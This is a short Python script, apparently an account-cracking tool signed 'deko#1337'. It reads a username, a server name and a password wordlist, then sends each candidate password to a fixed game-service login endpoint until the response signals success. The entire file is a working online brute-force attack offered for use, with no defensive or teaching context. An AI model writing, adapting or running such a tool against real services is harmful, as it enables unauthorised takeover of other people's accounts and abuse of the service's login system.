import requests
import json
import os
print("-------------------------------------------")
print("")
print("              deko#1337")
print("")
print("-------------------------------------------")
print("Enter username: ")
username = input()
print("Enter server: ")
server = input()
print("Enter .txt file with passwords directory: ")
directory = input()
print("-------------------------------------------")

webservice = "http://central-eu.rbpapis.com/clusterstat/login/nebula?v=1600785966245"

def crack(username, url, server):
	for password in passwords:
		password = password.strip()

		jsonRequest = { "p": password, "n": server + "|" + username}
		jsonEncode = json.dumps(jsonRequest)

		print("[-] Cracking with: " + password + " [-]")
		header = { "contenst-type": "application/json" }
		response = requests.post(url, headers=header, data=jsonEncode)
		if '{"code":0,' in response.text:
			print("[+] Found password: " + password + " [+]")
			break
		else:
			continue

with open(directory) as passwords:
	goodServer = server.upper()
	crack(username, webservice, goodServer)